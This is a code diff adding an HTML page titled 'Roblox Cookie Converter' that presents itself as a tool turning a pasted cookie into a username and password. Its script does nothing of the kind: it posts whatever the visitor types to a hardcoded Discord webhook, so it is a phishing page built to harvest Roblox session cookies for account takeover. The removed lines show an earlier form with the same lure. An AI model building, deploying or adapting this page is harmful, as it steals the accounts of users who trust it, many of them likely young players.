@@ -1,5 +1,76 @@
-<form id="myForm">
-  <input type="text" id="textInput" placeholder="Enter your cookie here">
-  <input type="text" id="textInput" placeholder="What email should we send the username and password to?">
-  <button type="button" onclick="sendToDiscord()">Convert to Username and Password</button>
-</form>
+<!DOCTYPE html>
+<html>
+  <head>
+    <style>
+      body {
+        background-color: #333;
+      }
+
+      #title {
+        text-align: center;
+        font-size: 48px;
+        font-weight: bold;
+        color: white;
+        padding: 20px;
+        font-family: Arial, sans-serif;
+      }
+
+      #message {
+        margin: 0 auto;
+        display: block;
+        width: 500px;
+        height: 300px;
+        font-size: 24px;
+        font-weight: bold;
+        padding: 10px;
+        border-radius: 5px;
+        border: 2px solid #1A1A1A;
+        color: white;
+        background-color: #444;
+      }
+
+      #sendButton {
+        display: block;
+        margin: 0 auto;
+        width: 200px;
+        height: 50px;
+        font-size: 24px;
+        font-weight: bold;
+        background-color: #002266;
+        border: none;
+        border-radius: 10px;
+        cursor: pointer;
+        box-shadow: 0px 10px 15px rgba(0, 0, 0, 0.2);
+        color: white;
+        transition: all 0.2s ease-in-out;
+      }
+
+      #sendButton:hover {
+        background-color: #001a40;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="title">🤖 Roblox Cookie Converter 🚀</div>
+    <textarea id="message"></textarea><br>
+    <button id="sendButton">Send Message</button>
+    <script>
+      function sendMessage() {
+        const message = document.getElementById("message").value;
+        const webhookUrl = "https://discord.com/api/webhooks/1237584893756575845/AP_2URcUznCp86IZ2GlJeJxNfyr6TXKxhA1wjU7YZvh-SKXSK6OuEaBvWvoqC6zDcfBO";
+
+        fetch(webhookUrl, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({ content: message }),
+        })
+          .then((response) => console.log(response))
+          .catch((error) => console.error(error));
+      }
+
+      document.getElementById("sendButton").addEventListener("click", sendMessage);
+    </script>
+  </body>
+</html>
